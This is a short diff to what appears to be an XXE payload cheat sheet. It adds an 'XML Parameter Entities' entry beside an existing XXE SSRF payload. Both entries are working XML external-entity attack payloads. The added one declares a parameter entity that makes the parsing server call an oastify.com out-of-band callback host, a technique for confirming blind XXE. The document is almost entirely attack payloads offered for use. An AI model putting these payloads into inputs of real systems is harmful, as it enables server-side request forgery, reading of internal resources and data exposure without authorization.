@@ -69,3 +69,11 @@ XXE SSRF
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
 <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
+
+XML Parameter Entities
+-------------
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://otlgufrmqz0l3e95998t12z9c0ir6ku9.oastify.com/">
+  %xxe;
+]>
+
